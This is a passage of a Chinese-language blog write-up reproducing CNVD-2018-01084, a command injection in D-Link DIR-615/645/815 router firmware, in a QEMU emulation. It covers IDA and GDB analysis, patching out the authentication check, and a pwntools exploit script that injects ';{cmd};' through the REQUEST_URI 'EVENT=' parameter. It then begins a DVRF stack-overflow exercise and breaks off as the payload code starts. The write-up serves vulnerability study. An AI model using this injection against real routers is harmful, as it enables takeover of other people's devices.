</span></span><span class="line"><span class="cl">            &lt;maxauthorized&gt;16&lt;/maxauthorized&gt;
</span></span><span class="line"><span class="cl">        &lt;/session&gt;
</span></span><span class="line"><span class="cl">    &lt;/device&gt;
</span></span><span class="line"><span class="cl">&lt;/module&gt;
</span></span><span class="line"><span class="cl">&lt;/postxml&gt;
</span></span></code></pre></div><div class="anchor" id="cnvd-2018-01084"></div>
<h3 class="relative group">CNVD-2018-01084 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#cnvd-2018-01084" style="text-decoration-line: none !important;">#</a></span>
</h3>
<div class="anchor" id="漏洞基本信息-3"></div>
<h4 class="relative group">漏洞基本信息 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e6%bc%8f%e6%b4%9e%e5%9f%ba%e6%9c%ac%e4%bf%a1%e6%81%af-3" style="text-decoration-line: none !important;">#</a></span>
</h4>
<ul>
<li>
<p>漏洞编号：CNVD-2018-01084</p>
</li>
<li>
<p>漏洞类型：远程命令执行</p>
</li>
<li>
<p>漏洞利用效果：可执行任意命令</p>
</li>
<li>
<p>漏洞披露时间：20180117</p>
</li>
<li>
<p>漏洞描述：</p>
<ul>
<li>D-Link DIR 615/645/815路由器1.03及之前的固件版本存在远程命令执行漏洞。该漏洞是由于service.cgi中拼接了HTTP POST请求中的数据，造成后台命令拼接，导致可执行任意命令。</li>
</ul>
</li>
<li>
<p>设备型号：D-Link DIR 615/645/815</p>
</li>
<li>
<p>设备架构：mips</p>
</li>
<li>
<p>复现进度：</p>
<ul>
<li>已成功复现</li>
<li>已进行静态分析</li>
<li>已进行动态调试</li>
</ul>
</li>
<li>
<p>受影响的漏洞组件 ：</p>
<ul>
<li>文件名：httpd</li>
<li>功能：用于处理用户发送的 HTTP 请求</li>
</ul>
</li>
<li>
<p>定位漏洞组件的方法和工具：</p>
<ul>
<li>静态分析工具
<ul>
<li>ida(32位)</li>
<li>ghidra</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li>service.cgi 远程命令执行漏洞</li>
<li>学习远程命令执行类漏洞的查找与利用方式</li>
</ul>
<p>[<a href="https://bbs.kanxue.com/thread-272212.htm" target="_blank">
    原创] CNVD-2018-01084 漏洞复现报告-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p>
<p><a href="https://blog.csdn.net/weixin_44229639/article/details/121118439" target="_blank">
    Dlink路由器 CNVD-2018-01084 远程命令执行漏洞 复现分析_cnvd-2018-01084复现-CSDN博客</a></p>
<p><a href="https://tsd.dlink.com.tw/ddwn" target="_blank">
    D-Link | Technical Support | Downloads (dlink.com.tw)</a></p>
<div class="anchor" id="解包-3"></div>
<h4 class="relative group">解包 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e8%a7%a3%e5%8c%85-3" style="text-decoration-line: none !important;">#</a></span>
</h4>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ wget https://ftp.dlink.ru/pub/Router/DIR-815/Firmware/RevA/Old/DIR815A1_FW101b09.bin
</span></span></code></pre></div><p>
<figure>
<img alt="image-20240224023454211" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/S34Wf8cvN1XaKEx.png"/>
</figure>
</p>
<div class="anchor" id="静态分析"></div>
<h4 class="relative group">静态分析 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e9%9d%99%e6%80%81%e5%88%86%e6%9e%90" style="text-decoration-line: none !important;">#</a></span>
</h4>
<p>参考<a href="https://bbs.kanxue.com/thread-272212.htm#msg_header_h3_3" target="_blank">
    CNVD-2018-01084 漏洞复现报告（service.cgi 远程命令执行漏洞）-二进制漏洞-看雪-安全社区</a> 进行分析</p>
<p>先<code>checksec</code>检查一下二进制文件：</p>
<p>
<figure>
<img alt="image-20240224174547747" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/Nvm5QCGuzitqs6D.png"/>
</figure>
</p>
<p>将其拖进<code>IDA</code>中先进行静态分析。</p>
<p>首先进入<code>main</code>函数，可以在66行看到<code>service.cgi</code>与传入的第一个参数<code>v3</code>相比较</p>
<p>
<figure>
<img alt="image-20240224211709027" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/9ygstIaiUdxWFu1.png"/>
</figure>
</p>
<p>
<figure>
<img alt="image-20240224211627769" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/2D5d4qxotFIwBKf.png"/>
</figure>
</p>
<p>当传入的第一个参数是<code>service.cgi</code>，比对成功后，会进入<code>servicecgi_main</code>函数。</p>
<p>我们先对<code>servicecgi_main</code>这个函数整体的调用路线进行一个宏观的分析：</p>
<p>右键查看外部引用至图表（说实话我也是第一次使用这个，还真不错）</p>
<p>
<figure>
<img alt="image-20240224212314196" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/IZla2jnxRqcToLk.png"/>
</figure>
</p>
<p>
<figure>
<img alt="image-20240224212242294" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/1XJxEpyj8dHYgcR.png"/>
</figure>
</p>
<p>我们猜测漏洞点存在于这里的<code>system</code>函数处，它是由<code>lxmldbc_system</code>函数调用的</p>
<p>所以我们在函数里面搜索 lxmldbc_system 并查看其伪代码</p>
<p>
<figure>
<img alt="image-20240224212649549" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/pOaQHUZ1bf7re9k.png"/>
</figure>
</p>
<p>在<code>lxmldbc_system</code>函数中，会先进行一个<strong>格式化字符串</strong>的拼接，再将拼接好的字符串作为<code>system</code>的参数调用，因此，这里的确可能存在一个可被利用的点：</p>
<p>接着，我们对<code>servicecgi_main</code>函数的流程进行一个分析：</p>
<p><strong>（1）先获取环境变量<code>REQUEST_METHOD</code>进行判断</strong></p>
<p>
<figure>
<img alt="img" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/NSQb1dWeslTDoc5.png"/>
</figure>
</p>
<p>当请求方式为<code>GET</code>的时候，会跳到标签<code>10</code>，而这个标签<code>10</code>在调用<code>lxmldbc_system</code>函数的下面：</p>
<p>
<figure>
<img alt="img" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/CpE4qBvH67ZFeJY.png"/>
</figure>
</p>
<p>所以，为了利用到<code>lxmldbc_system</code>中的漏洞，我们的<strong>请求方式只能为<code>POST</code></strong>。</p>
<p><strong>（2）分析<code>cgibin_parse_request</code>函数</strong></p>
<p>然后，会调用到<code>cgibin_parse_request</code>函数，这个函数会先调取环境变量<code>REQUEST_URI</code>，并对其先以<code>?</code>进行字符串分割：</p>
<p>
<figure>
<img alt="img" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/vkEyX7lgCdiIATe.png"/>
</figure>
</p>
<p>再进到<code>sub_402B40</code>函数中，发现这里会再以<code>=</code>进行一次字符串分割，对<code>=</code>后的内容再以<code>&amp;</code>进行分割：</p>
<p>
<figure>
<img alt="img" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/fyxSbRHnB3wojFi.png"/>
</figure>
</p>
<p>这其实就是对一个<code>URL</code>字符串的解析过程，分割后的字符串，都会被存放进内存中，具体存放在哪里，不太好直接通过静态分析看出。</p>
<p>之后，在<code>cgibin_parse_request</code>函数中，对<code>CONTENT_TYPE</code>这个环境变量进行了一个判断：</p>
<p>
<figure>
<img alt="img" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/CEc5uQyP1oOBKZJ.png"/>
</figure>
</p>
<p>这里先对环境变量<code>CONTENT_TYPE</code>中的内容的前<code>v17</code>位与<code>v18</code>进行一个比对，比对正确后就会调用一个未知的函数，这里的<code>v18</code>其实是<code>off_42C014</code>中的内容，而<code>v17</code>就是其后四个字节的内容：</p>
<p>
<figure>
<img alt="img" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/TSijxXfNpBFA5qd.png"/>
</figure>
</p>
<p>也就是说，我们**<code>CONTENT_TYPE</code>的前<code>12</code>位得是<code>application/</code>**才能过这个判断。</p>
<p>之后调用到的那个未知的函数也不方便直接通过静态分析看出，在之后动态调试的时候可以很清楚地看到，不过，这里需要注意一下传入这个未知函数的第三个参数<code>v7</code>，其实就是<code>CONTENT_LENGTH</code>这个环境变量：</p>
<p>
<figure>
<img alt="img" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/Tgz1CShsQ7LieEm.png"/>
</figure>
</p>
<p><strong>（3）分析<code>sess_ispoweruser</code>函数</strong></p>
<p>在之后，会需要绕过<code>sess_ispoweruser</code>函数，不然无法通过认证：</p>
<p>
<figure>
<img alt="img" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/G6tnbqLRZIi5Sxc.png"/>
</figure>
</p>
<p>这个函数会调用到<code>sess_validate</code>函数，其中会再调用到<code>sess_get_uid</code>函数，在里面有对<code>HTTP_COOKIE</code>和<code>REMOTE_ADDR</code>这两个环境变量的获取，这里就不作具体分析了。</p>
<p>接着，在<code>sess_validate</code>函数中会继续调用到<code>sub_407660</code>这个函数，其中会打开<code>/var/session/...</code>的文件：</p>
<p>
<figure>
<img alt="img" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/aC8Ke251m4TNiSE.png"/>
</figure>
</p>
<p>这个文件显然我们用<code>qemu</code>模拟的环境中是没有的，因此我们<strong>需要将<code>sess_ispoweruser</code>这个函数的相关判断给<code>patch</code>掉</strong>（直接将跳转命令改成<code>nop</code>空指令），不然就不便于进行后续利用了（会在这里卡住）：</p>
<p>单字节修改 0x40A398 地址</p>
<p>
<figure>
<img alt="image-20240224214329169" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/YJXOxKc1P7WmLeb.png"/>
</figure>
</p>
<p>
<figure>
<img alt="image-20240224214435088" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/ot1NEPKZMz5lIup.png"/>
</figure>
</p>
<p>然后保存即可</p>
<p>这样就直接跳过<code>sess_ispoweruser</code>函数的认证检验了，<strong>将<code>patch</code>过的二进制文件替换<code>htdocs</code>目录下原有的文件即可</strong>。</p>
<p><strong>（4）一些静态分析看不出来的操作</strong></p>
<p>再然后，会调用<code>sub_40A1C0</code>函数进行一些判断：</p>
<p>
<figure>
<img alt="img" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/PGcqLWXldOJZMUi.png"/>
</figure>
</p>
<p>显然，判断的结果若是<strong>满足<code>v6!=0</code>是最好的</strong>，因为这里<code>if</code>分支其实大体上都是对<code>v9</code>格式化字符串进行赋值，而<code>v6!=0</code>分支中的内容最简单，下面<code>else</code>分支中的内容会很复杂，当经过这个判断之后，有了**<code>v9</code>这个格式化字符串作为参数**，就可以直接走到<code>lxmldbc_system</code>函数进行漏洞利用了。</p>
<p>不过，这里<code>sub_40A1C0</code>函数中具体判断的内容不太好直接通过静态分析看出：</p>
<p>
<figure>
<img alt="img" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/BK8P6eWMxRlS4ZX.png"/>
</figure>
</p>
<p>这里的<code>a1</code>就是传进去的<code>EVENT / ACTION / SERVICE</code>这些参数，但是后面的<code>v3[2]</code>应该是用户可控的一个字符串，但是并不知道指向内存的何处。</p>
<p>同样地，<code>lxmldbc_system</code>函数中，<code>vsnprintf</code>函数的参数<code>va</code>（也就是拼接到前面<code>format</code>格式化字符串中的内容）不知道指向内存的何处，<code>va_start</code>函数同样不知道指向哪里：</p>
<p>这些都不好通过静态分析直接得出，但是可以猜测都是用户可控的，再联想到之前的<code>REQUEST_URI</code>环境变量分割出的字符串被存放在了内存中，我们也并不知道具体的存放位置，因此，<strong>可以猜测这里取的内存就是在之前存放的</strong>，为了验证这一观点，我们需要进行动态分析来调试。</p>
<div class="anchor" id="动态调试"></div>
<h4 class="relative group">动态调试 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e5%8a%a8%e6%80%81%e8%b0%83%e8%af%95" style="text-decoration-line: none !important;">#</a></span>
</h4>
<p>首先，我们需要知道如何向<code>main</code>函数传递参数<code>argv</code>和设置环境变量：</p>
<p>
<figure>
<img alt="image-20240224180845930" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/7mbfZXdNqunW1BP.png"/>
</figure>
</p>
<p>我们可以用<code>-0</code>选项传递第一个参数，用<code>-E</code>选项设置环境变量，用<code>-L</code>选项做到类似于更改根目录的效果，用<code>-strace</code>选项追踪程序执行时进程系统调用和所接收的信号，方便调试。</p>
<p>我们按顺序，先来调试一下<code>CONTENT_TYPE</code>环境变量中<code>application/</code>后应该设置成什么，也就需要知道这里进入的未知函数是什么：</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">strncasecmp</span><span class="p">(</span><span class="n">v14</span><span class="p">,</span> <span class="n">v18</span><span class="p">,</span> <span class="n">v17</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">              <span class="k">return</span> <span class="p">((</span><span class="kt">int</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">*</span><span class="p">)(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="p">))(</span><span class="o">&amp;</span><span class="n">off_42C014</span><span class="p">)[</span><span class="mi">3</span> <span class="o">*</span> <span class="n">v16</span> <span class="o">-</span> <span class="mi">1</span><span class="p">])(</span>
</span></span><span class="line"><span class="cl">                       <span class="n">a1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                       <span class="n">a2</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                       <span class="n">v7</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                       <span class="o">&amp;</span><span class="n">v14</span><span class="p">[</span><span class="n">v17</span><span class="p">]);</span>
</span></span></code></pre></div><p>看到对应的汇编：</p>
<p>
<figure>
<img alt="image-20240224212921859" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/uIyqKgtwzLXbDr5.png"/>
</figure>
</p>
<p>最后的跳转命令在<code>0x40346C</code>处，因此，调试的时候我们可以在这里下一个断点</p>
<p>先启动<code>qemu</code>用户模式：</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ qemu-mipsel -g <span class="m">9988</span> -L . <span class="se">\ </span>
</span></span><span class="line"><span class="cl">    -0 <span class="s2">"service.cgi"</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -E <span class="nv">REQUEST_METHOD</span><span class="o">=</span><span class="s2">"POST"</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -E <span class="nv">REQUEST_URI</span><span class="o">=</span><span class="s2">"test"</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -E <span class="nv">CONTENT_LENGTH</span><span class="o">=</span><span class="s2">"5"</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -E <span class="nv">CONTENT_TYPE</span><span class="o">=</span><span class="s2">"application/x-www-form-urlencoded"</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    ./htdocs/cgibin
</span></span></code></pre></div><div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1"># 另开一个终端</span>
</span></span><span class="line"><span class="cl">$ gdb-multiarch ./htdocs/cgibin
</span></span><span class="line"><span class="cl"><span class="c1"># gdb输入命令：</span>
</span></span><span class="line"><span class="cl">target remote:9988
</span></span></code></pre></div><p>
<figure>
<img alt="image-20240224030027023" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/w2WVGNUS34ay9lx.png"/>
</figure>
</p>
<p>
<figure>
<img alt="image-20240224172552927" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/tEmCN8hSgPrbw7d.png"/>
</figure>
</p>
<p>
<figure>
<img alt="image-20240224175150660" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/Yhnu31Ez6poWFkt.png"/>
</figure>
</p>
<p>可以很清晰地看到，那个我们静态分析不好看出来的未知函数就是<code>0x403b10</code>。</p>
<p>在<code>IDA</code>里找到<code>0x403b10</code>的位置，并创建函数</p>
<p>
<figure>
<img alt="image-20240224213111498" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/MCS1h9DqkInlHUP.png"/>
</figure>
</p>
<p>接着就可以查看伪代码了：</p>
<p>
<figure>
<img alt="image-20240224213204241" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/dgToLOYwmFCxGy9.png"/>
</figure>
</p>
<p>可见，<strong><code>CONTENT_TYPE</code>环境变量的后面应该是<code>x-www-form-urlencoded</code></strong>，匹配成功后，就会进入<code>sub_402FFC</code>函数，在其中会有一个<code>read</code>函数，需要我们读入数据：</p>
<p>sub_402FFC 函数的伪代码：</p>
<p>
<figure>
<img alt="image-20240224213341550" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/XfvwD75hWYkRNiJ.png"/>
</figure>
</p>
<p>这里的<code>v7</code>也就是<code>a3</code>，是我们在<code>cgibin_parse_request</code>函数中传入的环境变量<code>CONTENT_LENGTH</code>，根据之前的分析，我们需要这个函数的返回值<code>v4</code>大于零，<strong>只要读入合法的数据</strong>即可。</p>
<p>这一部分就分析到这，接下来再验证之前的猜想：<code>sub_40A1C0</code>函数中所取的内存是否为之前<code>REQUEST_URI</code>环境变量所分割出的字符串？</p>
<p>我们已经知道了<code>REQUEST_URI</code>大体的分割模式，因此可以设<code>REQUEST_URI="aaa?bbb=ccc"</code>的形式，启动命令如下：</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ qemu-mipsel -g <span class="m">9988</span> -L . <span class="se">\ </span>
</span></span><span class="line"><span class="cl">    -0 <span class="s2">"service.cgi"</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -E <span class="nv">REQUEST_METHOD</span><span class="o">=</span><span class="s2">"POST"</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -E <span class="nv">REQUEST_URI</span><span class="o">=</span><span class="s2">"aaa?bbb=ccc"</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -E <span class="nv">CONTENT_LENGTH</span><span class="o">=</span><span class="s2">"5"</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -E <span class="nv">CONTENT_TYPE</span><span class="o">=</span><span class="s2">"application/x-www-form-urlencoded"</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    ./htdocs/cgibin
</span></span></code></pre></div><p>
<figure>
<img alt="image-20240224174904392" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/SsVrUDv6oOthEiA.png"/>
</figure>
</p>
<p>在<code>sub_40A1C0</code>中<code>strcmp</code>的地方对应的汇编处（<code>0x40A200</code>）下一个断点：</p>
<p>
<figure>
<img alt="image-20240224213723862" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/vLK7yafoGkXRDmn.png"/>
</figure>
</p>
<p>在之前随便输入十个字符，最后停止了断点处</p>
<p>
<figure>
<img alt="image-20240224180150371" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/NbVrXHCRPeaQcDY.png"/>
</figure>
</p>
<p>由此可知，<strong><code>strcmp</code>的第二个参数就是环境变量<code>REQUEST_URI</code>中<code>?</code>与<code>=</code>之间的字符串</strong>。</p>
<p>用同样的方法，可以得到：<strong><code>lxmldbc_system</code>中拼接入格式化字符串的<code>va</code>参数就是环境变量<code>REQUEST_URI</code>中<code>=</code>之后的字符串</strong>。</p>
<p>至此，我们完成了对<code>/htdocs/cgibin</code>这个二进制文件中的漏洞分析，显然，<strong>我们将<code>;{cmd};</code>拼接进格式化字符串，由于<code>;</code>可连接两个独立语句并执行，这样就能执行我们的<code>cmd</code>命令了</strong></p>
<div class="anchor" id="exp"></div>
<h4 class="relative group">exp 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#exp" style="text-decoration-line: none !important;">#</a></span>
</h4>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">'linux'</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">'mips'</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">string</span> <span class="o">=</span> <span class="s2">"winmt"</span>
</span></span><span class="line"><span class="cl"><span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">"----- CNVD-2018-01084 -----</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">cmd</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">"command &gt; "</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="sa">f</span><span class="s1">'''
</span></span></span><span class="line"><span class="cl"><span class="s1">    qemu-mipsel -L . -strace </span><span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="s1">    -0 "service.cgi" </span><span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="s1">    -E REQUEST_METHOD="POST" </span><span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="s1">    -E CONTENT_LENGTH=</span><span class="si">{</span><span class="n">length</span><span class="si">}</span><span class="s1"> </span><span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="s1">    -E REQUEST_URI="?EVENT=;</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s1">;" </span><span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="s1">    -E CONTENT_TYPE="application/x-www-form-urlencoded" </span><span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="s1">    -E HTTP_COOKIE="uid=winmt" </span><span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="s1">    -E REMOTE_ADDR="127.0.0.1" </span><span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="s1">    ./htdocs/cgibin
</span></span></span><span class="line"><span class="cl"><span class="s1">'''</span><span class="p">,</span> <span class="n">shell</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">string</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><div class="anchor" id="dvrf项目"></div>
<h2 class="relative group">DVRF项目 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#dvrf%e9%a1%b9%e7%9b%ae" style="text-decoration-line: none !important;">#</a></span>
</h2>
<p><a href="https://github.com/praetorian-inc/DVRF" target="_blank">
    praetorian-inc/DVRF: The Damn Vulnerable Router Firmware Project (github.com)</a></p>
<blockquote>
<p>通过利用DVRF项目来进一步分析设备固件，挖掘固件中存在的安全漏洞。该项目的目的是模拟真实设备环境，帮助人们了解 除x86_64 空间之外的其他 CPU 架构</p>
</blockquote>
<div class="anchor" id="解包-4"></div>
<h3 class="relative group">解包 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e8%a7%a3%e5%8c%85-4" style="text-decoration-line: none !important;">#</a></span>
</h3>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ binwalk -Me DVRF_v03.bin
</span></span></code></pre></div><p>
<figure>
<img alt="image-20240224151015891" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/CrbTxckilLQfSXu.png"/>
</figure>
</p>
<div class="anchor" id="dvrf-stack_bof_01"></div>
<h3 class="relative group">DVRF stack_bof_01 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#dvrf-stack_bof_01" style="text-decoration-line: none !important;">#</a></span>
</h3>
<div class="anchor" id="静态分析-1"></div>
<h4 class="relative group">静态分析 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e9%9d%99%e6%80%81%e5%88%86%e6%9e%90-1" style="text-decoration-line: none !important;">#</a></span>
</h4>
<p>
<figure>
<img alt="image-20240224151824352" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/galkD8qECohdp3H.png"/>
</figure>
</p>
<p>放入ghidra中进行分析</p>
<p>
<figure>
<img alt="image-20240224161319569" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/SBjf3RXtoMIQ5ae.png"/>
</figure>
</p>
<p>获取参数后，未校验长度赋值给局部变量造成栈溢出</p>
<p>而且可以看到有后门函数 0x00400950：</p>
<p>
<figure>
<img alt="image-20240224152530332" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/BX85uxPTjnEMUkr.png"/>
</figure>
</p>
<p>所以我们可以利用栈溢出来覆盖返回地址的值来是程序运行到后门函数</p>
<div class="anchor" id="动态调试-1"></div>
<h4 class="relative group">动态调试 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e5%8a%a8%e6%80%81%e8%b0%83%e8%af%95-1" style="text-decoration-line: none !important;">#</a></span>
</h4>
<p>与平时打pwn时对二进制程序进行gdb调试差不多，</p>
<p>不同在于mips架构需要再qemu上运行</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ <span class="nb">cd</span> /home/iot/vul/DVRF/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root
</span></span><span class="line"><span class="cl">$ cp <span class="k">$(</span>which qemu-mipsel-static<span class="k">)</span> ./qemu-mipsel-static
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">"test"</span> &gt; content
</span></span><span class="line"><span class="cl">$ sudo chroot . ./qemu-mipsel-static -L ./ -g <span class="m">9988</span> ./pwnable/Intro/stack_bof_01 <span class="s2">"`cat content`"</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 注意要在cat content的外面加上“”</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 另开一个终端</span>
</span></span><span class="line"><span class="cl">$ gdb-multiarch ./pwnable/Intro/stack_bof_01
</span></span><span class="line"><span class="cl"><span class="c1"># gdb爱输入命令：</span>
</span></span><span class="line"><span class="cl"><span class="nb">set</span> arch mips 
</span></span><span class="line"><span class="cl"><span class="nb">set</span> endian big/little 
</span></span><span class="line"><span class="cl">target remote remote:9988
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 连上之后会停在 start ，在 main 函数开头打断点，运行到这个断点，然后就可以慢慢单步调试</span>
</span></span></code></pre></div><p>
<figure>
<img alt="image-20240224160535083" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/Bn3uOFCXpDMdgj5.png"/>
</figure>
</p>
<div class="anchor" id="exp-1"></div>
<h4 class="relative group">exp 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#exp-1" style="text-decoration-line: none !important;">#</a></span>
</h4>
<p>生成payload:</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
